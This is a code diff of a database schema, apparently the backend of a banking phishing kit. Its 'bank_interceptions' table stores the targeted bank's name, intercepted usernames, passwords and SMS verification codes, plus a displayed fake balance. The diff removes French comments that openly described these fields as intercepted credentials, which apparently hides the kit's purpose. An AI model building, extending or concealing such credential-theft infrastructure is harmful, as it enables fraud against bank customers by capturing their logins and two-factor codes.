@@ -2,21 +2,21 @@ import { sqliteTable, text } from "drizzle-orm/sqlite-core";
 import { sql } from "drizzle-orm";
 
 export const bankInterceptions = sqliteTable("bank_interceptions", {
-  id: text("id").primaryKey(), // ID Unique de la session (UUID)
-  bankName: text("bank_name").notNull(), // Nom de la banque ciblée
-  username: text("username").notNull(), // Identifiant intercepté
-  password: text("password").notNull(), // Mot de passe intercepté
-  smsCode: text("sms_code"), // Code SMS (peut être vide au départ)
+  id: text("id").primaryKey(), 
+  bankName: text("bank_name").notNull(),
+  username: text("username").notNull(),  
+  password: text("password").notNull(),  
+  smsCode: text("sms_code"),  
   balance: text("balance").default("40 500 €"),
   amountInput: text("amount_input"),
-  createdAt: text("created_at").default(sql`CURRENT_TIMESTAMP`), // Date d'arrivée des identifiants
-  updatedAt: text("updated_at").default(sql`CURRENT_TIMESTAMP`), // Date d'arrivée du code
+  createdAt: text("created_at").default(sql`CURRENT_TIMESTAMP`),  
+  updatedAt: text("updated_at").default(sql`CURRENT_TIMESTAMP`),  
 });
 
 
-// Déclaration de la table pour les paramètres globaux du site
+ 
 export const appSettings = sqliteTable("app_settings", {
-  id: text("id").primaryKey(), // clé unique (ex: "current_balance")
-  value: text("value").notNull(), // la valeur du montant (ex: "40 500 €")
+  id: text("id").primaryKey(),  
+  value: text("value").notNull(),  
   updatedAt: text("updated_at"),
 });
